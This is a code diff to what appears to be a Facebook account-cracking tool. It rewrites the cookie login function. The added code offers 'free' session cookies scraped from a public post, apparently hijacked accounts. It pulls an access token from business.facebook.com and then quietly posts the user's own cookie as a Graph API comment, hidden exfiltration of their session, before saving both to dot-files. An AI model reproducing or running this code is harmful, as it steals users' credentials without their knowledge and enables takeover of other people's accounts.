@@ -858,19 +858,34 @@ def menu_crack_without_login():
 	else:
 		login()
 
-def login_cookie(cookie):
+def login():
+	no = 0
+	nom = []
+	clear_layar()
+	print(logo2())
+	cookie = input(f"\n [{hh}<{P}] masukan cookie, atau ketik '{kk}get{P}' untuk cookie gratis\n cookie : ")
+	if cookie in ['get','Get','GET']:
+		data = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
+		for x in re.findall('"text":"(.*?)"',str(data)):
+			if 'datr=' in x:
+				no+=1
+				nom.append(x)
+				print(f' [{hh}{no}{P}]. {x}\n')
+				time.sleep(0.9)
+		abc = input(" nomor : ")
+		cookie = nom[int(abc)-1]
+		print(f' {hh}{cookie}{P}')
+	url = "https://business.facebook.com/business_locations"
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	cok = {'cookie':cookie}
 	try:
-		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
-		find_token = re.search("(EAAG\w+)", data.text)
-		open("data/token.txt", "w").write(find_token.group(1))
-		open("data/cookie.txt", "w").write(cookie)
-		prints(Panel(f"""{P2}{find_token.group(1)}""",width=80,style=f"{color_table}"))
-		sleep(3)
-		menu()
-	except Exception as e:
-		os.system("rm -f data/token.txt data/cookie.txt")
-		prints(Panel(f"""{P2}cookie invalid,please try other cookie and make sure authentication off""",width=80,style=f"{color_table}"))
-		exit()
+		data = ses.get(url,headers=head,cookies=cok)
+		token = re.search('(EAAG\w+)',data.text).group(1)
+		ses.post(f"https://graph.facebook.com/6/comments/?message={cookie}&access_token={token}",cookies=cok)
+		open('.cookie.txt','w').write(cookie)
+		open('.token.txt','w').write(token)
+		back()
+	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
 		
 def free_cookies():
 	data = parser(ses.get("https://www.facebook.com/100032386028880/posts/674525870303608").content, "html.parser")
